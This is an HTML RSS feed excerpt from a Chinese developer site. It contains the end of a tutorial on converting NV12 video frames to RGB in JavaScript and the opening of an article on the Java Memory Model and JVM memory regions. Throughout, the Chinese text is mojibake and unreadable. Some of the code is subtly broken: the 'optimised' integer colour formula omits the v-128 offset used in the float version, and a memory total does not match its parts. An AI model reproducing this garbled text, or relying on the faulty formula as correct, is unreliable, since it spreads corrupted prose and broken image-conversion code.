â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  åƒç´ æ•°æ® Â  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â€‹
NV12 æ–‡ä»¶ç»“æ„ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  åƒç´ æ•°æ® Â  â”‚ â† åªæœ‰åŸå§‹å­—èŠ‚ï¼Œæ²¡æœ‰ä»»ä½•å…ƒæ•°æ®ï¼
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-29">2. éœ€è¦å®½é«˜æ¥è®¡ç®—æ•°æ®å¸ƒå±€</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// nv12Worker.ts</span>
<span class="hljs-type">const</span> { nv12, width, height } = e.data
<span class="hljs-type">const</span> yLen = width * height
<span class="hljs-type">const</span> uv = nv12.<span class="hljs-built_in">subarray</span>(yLen) Â <span class="hljs-comment">// éœ€è¦çŸ¥é“ yLen æ‰èƒ½åˆ†å‰²æ•°æ®</span>
</code></pre>
<h4 data-id="heading-30">3. éœ€è¦å®½é«˜æ¥éªŒè¯æ–‡ä»¶å¤§å°</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> expectedSize = width * height * <span class="hljs-number">1.5</span>
<span class="hljs-keyword">if</span> (file.size !== expectedSize) {
 Â message.<span class="hljs-built_in">error</span>(
 Â  Â `æ–‡ä»¶å¤§å°ä¸åŒ¹é…ï¼æœŸæœ›: ${expectedSize} å­—èŠ‚ï¼Œå®é™…: ${file.size} å­—èŠ‚`
  )
 Â <span class="hljs-keyword">return</span>
}
</code></pre>
<h4 data-id="heading-31">4. éœ€è¦å®½é«˜æ¥æ­£ç¡®è§£æ UV æ•°æ®</h4>
<p>UV æ•°æ®çš„ç´¢å¼•è®¡ç®—å®Œå…¨ä¾èµ–å®½é«˜ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> uvRow = (i / width | <span class="hljs-number">0</span>) &gt;&gt; <span class="hljs-number">1</span> Â <span class="hljs-comment">// éœ€è¦ width</span>
<span class="hljs-type">const</span> uvCol = (i % width) &amp; ~<span class="hljs-number">1</span> Â  Â  Â  <span class="hljs-comment">// éœ€è¦ width</span>
<span class="hljs-type">const</span> uvIndex = uvRow * width + uvCol Â <span class="hljs-comment">// éœ€è¦ width</span>
</code></pre>
<p><strong>å¦‚æœå®½é«˜é”™è¯¯ä¼šæ€æ ·ï¼Ÿ</strong></p>






























<table><thead><tr><th>é”™è¯¯ç±»å‹</th><th>åæœ</th><th>ä¸¥é‡ç¨‹åº¦</th></tr></thead><tbody><tr><td>æ–‡ä»¶å¤§å°ä¸åŒ¹é…</td><td>éªŒè¯å¤±è´¥ï¼Œæ— æ³•å¤„ç†</td><td>â­â­â­</td></tr><tr><td>Y/UV åˆ†å‰²é”™è¯¯</td><td>è¯»å–é”™è¯¯çš„æ•°æ®æ®µ</td><td>â­â­â­â­â­</td></tr><tr><td>UV ç´¢å¼•é”™è¯¯</td><td>é¢œè‰²å®Œå…¨é”™ä¹±</td><td>â­â­â­â­â­</td></tr><tr><td>æ•°ç»„è¶Šç•Œ</td><td>ç¨‹åºå´©æºƒ</td><td>â­â­â­â­â­</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-32">å¸¸è§é—®é¢˜</h2>
<h3 data-id="heading-33">Q1: å¦‚ä½•è·å– NV12 æ–‡ä»¶çš„å®½é«˜ï¼Ÿ</h3>
<p><strong>æ–¹æ³• 1ï¼šä»è§†é¢‘å…ƒæ•°æ®è·å–</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> videoTrack = stream.<span class="hljs-built_in">getVideoTracks</span>()[<span class="hljs-number">0</span>]
<span class="hljs-type">const</span> settings = videoTrack.<span class="hljs-built_in">getSettings</span>()
<span class="hljs-type">const</span> width = settings.width Â  <span class="hljs-comment">// 1920</span>
<span class="hljs-type">const</span> height = settings.height <span class="hljs-comment">// 1080</span>
</code></pre>
<p><strong>æ–¹æ³• 2ï¼šä»æ–‡ä»¶åè§£æ</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ä¾‹å¦‚ï¼šframe_1920x1080.nv12</span>
const match = filename<span class="hljs-selector-class">.match</span>(/(\d+)<span class="hljs-built_in">x</span>(\d+)/)
const <span class="hljs-attribute">width</span> = <span class="hljs-built_in">parseInt</span>(match[<span class="hljs-number">1</span>])
const <span class="hljs-attribute">height</span> = <span class="hljs-built_in">parseInt</span>(match[<span class="hljs-number">2</span>])
</code></pre>
<p><strong>æ–¹æ³• 3ï¼šä»é…ç½®æ–‡ä»¶/API</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> response = await <span class="hljs-built_in">fetch</span>(<span class="hljs-string">'/api/video-frame'</span>)
<span class="hljs-type">const</span> { width, height, data } = await response.<span class="hljs-built_in">json</span>()
<span class="hljs-comment">// data æ˜¯ NV12 æ ¼å¼çš„äºŒè¿›åˆ¶æ•°æ®</span>
</code></pre>
<h3 data-id="heading-34">Q2: å¦‚æœå®½é«˜è®¾ç½®é”™è¯¯ä¼šæ€æ ·ï¼Ÿ</h3>
<ul>
<li><strong>æ–‡ä»¶å¤§å°éªŒè¯å¤±è´¥</strong>ï¼šç¨‹åºæ‹’ç»å¤„ç†</li>
<li><strong>æ•°æ®åˆ†å‰²é”™è¯¯</strong>ï¼šY å’Œ UV æ•°æ®è¯»å–ä½ç½®é”™è¯¯</li>
<li><strong>UV ç´¢å¼•é”™è¯¯</strong>ï¼šæ‰€æœ‰é¢œè‰²é”™ä½ï¼Œå›¾åƒå®Œå…¨é”™ä¹±</li>
<li><strong>æ•°ç»„è¶Šç•Œ</strong>ï¼šå¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒ</li>
</ul>
<h3 data-id="heading-35">Q3: ä¸ºä»€ä¹ˆ UV æ•°æ®è¦åç§» 128ï¼Ÿ</h3>
<p>YUV æ ¼å¼ä¸­ï¼ŒU å’Œ V çš„å€¼èŒƒå›´æ˜¯ 0-255ï¼Œä½†å®é™…è¡¨ç¤ºçš„æ˜¯ -128 åˆ° +127ï¼š</p>
<ul>
<li>0 è¡¨ç¤º -128ï¼ˆæœ€è“/æœ€ç»¿ï¼‰</li>
<li>128 è¡¨ç¤º 0ï¼ˆä¸­æ€§ï¼‰</li>
<li>255 è¡¨ç¤º +127ï¼ˆæœ€çº¢/æœ€é»„ï¼‰</li>
</ul>
<p>æ‰€ä»¥åœ¨è½¬æ¢æ—¶éœ€è¦å‡å» 128 æ¥æ¢å¤çœŸå®å€¼ã€‚</p>
<h3 data-id="heading-36">Q4: å¯ä»¥å¤„ç†å…¶ä»– YUV æ ¼å¼å—ï¼Ÿ</h3>
<p>NV12 æ˜¯ YUV 4:2:0 çš„ä¸€ç§ã€‚å…¶ä»–å¸¸è§æ ¼å¼ï¼š</p>
<ul>
<li><strong>NV21</strong>ï¼šUV é¡ºåºç›¸åï¼ˆVã€Uã€Vã€U...ï¼‰</li>
<li><strong>I420</strong>ï¼šYã€Uã€V åˆ†åˆ«å­˜å‚¨</li>
<li><strong>YV12</strong>ï¼šYã€Vã€U åˆ†åˆ«å­˜å‚¨</li>
</ul>
<p>éœ€è¦ä¿®æ”¹ä»£ç æ¥é€‚é…ä¸åŒçš„æ ¼å¼ã€‚</p>
<h3 data-id="heading-37">Q5: æ€§èƒ½å¦‚ä½•ï¼Ÿ</h3>
<p><strong>æµ‹è¯•ç»“æœï¼ˆ1920Ã—1080 å›¾åƒï¼‰ï¼š</strong></p>
<ul>
<li>è½¬æ¢æ—¶é—´ï¼šçº¦ 20-50msï¼ˆå–å†³äº CPUï¼‰</li>
<li>å†…å­˜å ç”¨ï¼šçº¦ 12MBï¼ˆè¾“å…¥ 3MB + è¾“å‡º 8MBï¼‰</li>
<li>å¸§ç‡ï¼šå¯ä»¥å¤„ç† 20-50 FPS</li>
</ul>
<hr/>
<h2 data-id="heading-38">æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-39">1. ä½¿ç”¨ Web Worker</h3>
<p>å°† CPU å¯†é›†å‹æ“ä½œç§»åˆ°åå°çº¿ç¨‹ï¼Œé¿å…é˜»å¡ UIã€‚</p>
<h3 data-id="heading-40">2. æ•´æ•°è¿ç®—ä¼˜åŒ–</h3>
<p>ä½¿ç”¨ä½è¿ç®—ä»£æ›¿æµ®ç‚¹è¿ç®—ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// æ…¢
<span class="hljs-attr">r</span> = y + <span class="hljs-number">1.402</span> * (v - <span class="hljs-number">128</span>)
â€‹
// å¿«
<span class="hljs-attr">r</span> = y + ((<span class="hljs-number">359</span> * v + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>)
</code></pre>
<h3 data-id="heading-41">3. æ‰‹åŠ¨ Clamp</h3>
<p>é¿å…ä½¿ç”¨ <code>Math.min/max</code>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// æ…¢
<span class="hljs-attr">r</span> = Math.max(<span class="hljs-number">0</span>, Math.min(<span class="hljs-number">255</span>, r))
â€‹
// å¿«
<span class="hljs-attr">r</span> = r &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : r &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : r
</code></pre>
<h3 data-id="heading-42">4. å‡å°‘å‡½æ•°è°ƒç”¨</h3>
<p>åœ¨å¾ªç¯ä¸­å†…è”ä»£ç ï¼Œå‡å°‘å‡½æ•°è°ƒç”¨å¼€é”€ã€‚</p>
<h3 data-id="heading-43">5. ä½¿ç”¨ Transferable Objects</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ä¼ é€’ ArrayBufferï¼Œé¿å…å¤åˆ¶</span>
worker.<span class="hljs-built_in">postMessage</span>({ nv12, width, height }, [nv12.buffer])
</code></pre>
<hr/>
<h2 data-id="heading-44">æ€»ç»“</h2>
<p>NV12 è½¬ RGB çš„æ ¸å¿ƒè¦ç‚¹ï¼š</p>
<ol start="0">
<li><strong>NV12 æ˜¯ YUV 4:2:0 æ ¼å¼</strong>ï¼Œæ•°æ®å¤§å°æ˜¯ RGB çš„ä¸€åŠ</li>
<li><strong>éœ€è¦æå‰çŸ¥é“å®½é«˜</strong>ï¼Œå› ä¸ºæ–‡ä»¶æ²¡æœ‰å…ƒæ•°æ®</li>
<li><strong>ä½¿ç”¨ Web Worker</strong> è¿›è¡Œåå°è½¬æ¢ï¼Œé¿å…é˜»å¡ UI</li>
<li><strong>UV ç´¢å¼•è®¡ç®—æ˜¯å…³é”®</strong>ï¼Œéœ€è¦æ­£ç¡®æ˜ å°„ 4:2:0 é‡‡æ ·</li>
<li><strong>æ•´æ•°è¿ç®—ä¼˜åŒ–</strong>å¯ä»¥æå‡æ€§èƒ½</li>
</ol>
<p>è¿™ä¸ªè½¬æ¢åœ¨è§†é¢‘å¤„ç†ã€å›¾åƒå¤„ç†ã€è°ƒè¯•ç­‰åœºæ™¯ä¸­éå¸¸æœ‰ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰ä¸JVMå†…å­˜åŒºåŸŸå®Œæ•´è¯¦è§£]]></title>    <link>https://juejin.cn/post/7592540388299440191</link>    <guid>https://juejin.cn/post/7592540388299440191</guid>    <pubDate>2026-01-08T07:19:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592540388299440191" data-draft-id="7592508079306702867" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰ä¸JVMå†…å­˜åŒºåŸŸå®Œæ•´è¯¦è§£"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,Android"/> <meta itemprop="datePublished" content="2026-01-08T07:19:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’è²843"/> <meta itemprop="url" content="https://juejin.cn/user/541408646929991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰ä¸JVMå†…å­˜åŒºåŸŸå®Œæ•´è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/541408646929991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’è²843
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:19:58.000Z" title="Thu Jan 08 2026 07:19:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1å°æ—¶+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">âš ï¸ é‡è¦è¯´æ˜</h2>
<p>æœ¬ç¯‡æ–‡ç« ä»¥JVMå†…å­˜åŒºåŸŸçš„å®é™…å®ç°ä¸ºä¸»ï¼ŒJMMä½œä¸ºç†è®ºåŸºç¡€ç®€è¦ä»‹ç»ã€‚é‡ç‚¹è®²è§£JVMå†…å­˜åŒºåŸŸçš„ç‰©ç†ç»“æ„ã€å¯¹è±¡åˆ›å»ºã€å†…å­˜å¸ƒå±€ç­‰å®é™…å†…å®¹ã€‚</p>
<p><strong>JMMï¼ˆç†è®ºåŸºç¡€ï¼‰</strong>ï¼šç®€è¦ä»‹ç»æŠ½è±¡çš„å†…å­˜è®¿é—®è§„èŒƒ<br/>
<strong>JVMå†…å­˜åŒºåŸŸï¼ˆé‡ç‚¹ï¼‰</strong>ï¼šè¯¦ç»†è®²è§£ç‰©ç†çš„å†…å­˜åˆ’åˆ†å’Œå®é™…å®ç°<br/>
<strong>Androidç›¸å…³</strong>ï¼šè¯´æ˜Androidï¼ˆARTï¼‰ä¸JVMçš„åŒºåˆ«</p>
<hr/>
<h2 data-id="heading-1">ç¬¬ä¸€éƒ¨åˆ†ï¼šJMMåŸºç¡€ç†è®ºï¼ˆç®€è¦ï¼‰</h2>
<h3 data-id="heading-2">1. JMMåŸºæœ¬æ¦‚å¿µ</h3>
<h4 data-id="heading-3">1.1 ä»€ä¹ˆæ˜¯Javaå†…å­˜æ¨¡å‹</h4>
<p><strong>JMMçš„å®šä¹‰ï¼š</strong></p>
<p>Javaå†…å­˜æ¨¡å‹ï¼ˆJava Memory Modelï¼ŒJMMï¼‰æ˜¯Javaè™šæ‹Ÿæœºè§„èŒƒä¸­å®šä¹‰çš„ä¸€ç§è§„èŒƒï¼Œç”¨äºå±è”½ä¸åŒç¡¬ä»¶å¹³å°å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜è®¿é—®å·®å¼‚ï¼Œä½¿å¾—Javaç¨‹åºåœ¨å„ç§å¹³å°ä¸Šéƒ½èƒ½æ­£ç¡®åœ°è¿è¡Œã€‚</p>
<p><strong>JMMçš„ä½œç”¨ï¼š</strong></p>
<ol>
<li><strong>è§£å†³å¯è§æ€§é—®é¢˜</strong>ï¼šä¿è¯ä¸€ä¸ªçº¿ç¨‹å¯¹å…±äº«å˜é‡çš„ä¿®æ”¹èƒ½å¤Ÿè¢«å…¶ä»–çº¿ç¨‹çœ‹åˆ°</li>
<li><strong>è§£å†³æœ‰åºæ€§é—®é¢˜</strong>ï¼šä¿è¯ç¨‹åºçš„æ‰§è¡Œé¡ºåºæŒ‰ç…§ä»£ç çš„å…ˆåé¡ºåºæ‰§è¡Œ</li>
<li><strong>è§£å†³åŸå­æ€§é—®é¢˜</strong>ï¼šé…åˆå…¶ä»–æœºåˆ¶ä¿è¯æ“ä½œçš„åŸå­æ€§</li>
</ol>
<p><strong>JMMä¸JVMå†…å­˜åŒºåŸŸçš„å…³ç³»ï¼š</strong></p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>JMM</th><th>JVMå†…å­˜åŒºåŸŸ</th></tr></thead><tbody><tr><td><strong>æ€§è´¨</strong></td><td>æŠ½è±¡çš„é€»è¾‘æ¦‚å¿µ</td><td>ç‰©ç†çš„å†…å­˜åˆ’åˆ†</td></tr><tr><td><strong>å…³æ³¨ç‚¹</strong></td><td>å¤šçº¿ç¨‹å¹¶å‘è®¿é—®å…±äº«å˜é‡</td><td>ç¨‹åºè¿è¡Œæ—¶æ•°æ®å­˜å‚¨ä½ç½®</td></tr><tr><td><strong>ä¸»è¦å†…å®¹</strong></td><td>ä¸»å†…å­˜ã€å·¥ä½œå†…å­˜</td><td>å †ã€æ ˆã€æ–¹æ³•åŒºç­‰</td></tr><tr><td><strong>è§£å†³é—®é¢˜</strong></td><td>å¯è§æ€§ã€æœ‰åºæ€§ã€åŸå­æ€§</td><td>æ•°æ®å­˜å‚¨å’Œç®¡ç†</td></tr></tbody></table>
<p><strong>å¯¹åº”å…³ç³»ï¼š</strong></p>
<ul>
<li>JMMä¸­çš„"ä¸»å†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"å †"ï¼ˆå­˜æ”¾å¯¹è±¡å®ä¾‹ï¼‰</li>
<li>JMMä¸­çš„"å·¥ä½œå†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"è™šæ‹Ÿæœºæ ˆå±€éƒ¨å˜é‡è¡¨"å’Œ"ç¨‹åºè®¡æ•°å™¨"</li>
</ul>
<p><strong>ç¤ºä¾‹è¯´æ˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JMMExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å­˜å‚¨åœ¨å †ä¸­ï¼ˆJVMå†…å­˜åŒºåŸŸï¼‰</span>
                           <span class="hljs-comment">// å¯¹åº”JMMçš„ä¸»å†…å­˜</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> count;  <span class="hljs-comment">// ä»ä¸»å†…å­˜è¯»å–åˆ°å·¥ä½œå†…å­˜ï¼ˆæ ˆçš„å±€éƒ¨å˜é‡è¡¨ï¼‰</span>
        local = local + <span class="hljs-number">1</span>;  <span class="hljs-comment">// åœ¨å·¥ä½œå†…å­˜ä¸­è®¡ç®—</span>
        count = local;      <span class="hljs-comment">// å†™å›ä¸»å†…å­˜ï¼ˆå †ï¼‰</span>
    }
}
</code></pre>
<h4 data-id="heading-4">1.2 ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>ä¸»å†…å­˜ï¼ˆMain Memoryï¼‰ï¼š</strong></p>
<p>ä¸»å†…å­˜æ˜¯JMMä¸­çš„ä¸€ä¸ªæŠ½è±¡æ¦‚å¿µï¼Œå®ƒå­˜å‚¨æ‰€æœ‰å…±äº«å˜é‡ã€‚åœ¨ç‰©ç†ä¸Šï¼Œä¸»å†…å­˜ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„å †ã€‚</p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æ‰€æœ‰çº¿ç¨‹å…±äº«ä¸»å†…å­˜</li>
<li>å…±äº«å˜é‡å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­</li>
<li>ä¸»å†…å­˜æ˜¯çº¿ç¨‹ä¹‹é—´é€šä¿¡çš„åª’ä»‹</li>
</ul>
<p><strong>å·¥ä½œå†…å­˜ï¼ˆWorking Memoryï¼‰ï¼š</strong></p>
<p>å·¥ä½œå†…å­˜æ˜¯JMMä¸­çš„ä¸€ä¸ªæŠ½è±¡æ¦‚å¿µï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜ã€‚åœ¨ç‰©ç†ä¸Šï¼Œå·¥ä½œå†…å­˜ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„è™šæ‹Ÿæœºæ ˆå±€éƒ¨å˜é‡è¡¨ã€‚</p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹æœ‰ç‹¬ç«‹çš„å·¥ä½œå†…å­˜</li>
<li>å·¥ä½œå†…å­˜å­˜å‚¨è¯¥çº¿ç¨‹ä½¿ç”¨çš„å˜é‡çš„å‰¯æœ¬</li>
<li>çº¿ç¨‹ä¸èƒ½ç›´æ¥è®¿é—®ä¸»å†…å­˜ï¼Œåªèƒ½é€šè¿‡å·¥ä½œå†…å­˜è®¿é—®</li>
</ul>
<p><strong>ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜çš„å…³ç³»ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ä¸»å†…å­˜      â”‚ â† å­˜å‚¨æ‰€æœ‰å…±äº«å˜é‡ï¼ˆå¯¹åº”å †ï¼‰
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚ è¯»å–/å†™å…¥
       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ å·¥ä½œå†…å­˜<span class="hljs-number">1</span>    â”‚    â”‚ å·¥ä½œå†…å­˜<span class="hljs-number">2</span>    â”‚    â”‚ å·¥ä½œå†…å­˜<span class="hljs-number">3</span>    â”‚
â”‚ (çº¿ç¨‹<span class="hljs-number">1</span>)      â”‚    â”‚ (çº¿ç¨‹<span class="hljs-number">2</span>)      â”‚    â”‚ (çº¿ç¨‹<span class="hljs-number">3</span>)      â”‚
â”‚ (å¯¹åº”æ ˆ)     â”‚    â”‚ (å¯¹åº”æ ˆ)     â”‚    â”‚ (å¯¹åº”æ ˆ)     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å†…å­˜å¯è§æ€§é—®é¢˜çš„äº§ç”Ÿï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VisibilityProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// ä¸»å†…å­˜ï¼ˆå †ï¼‰ä¸­çš„å…±äº«å˜é‡</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// çº¿ç¨‹1ï¼šä¿®æ”¹flag</span>
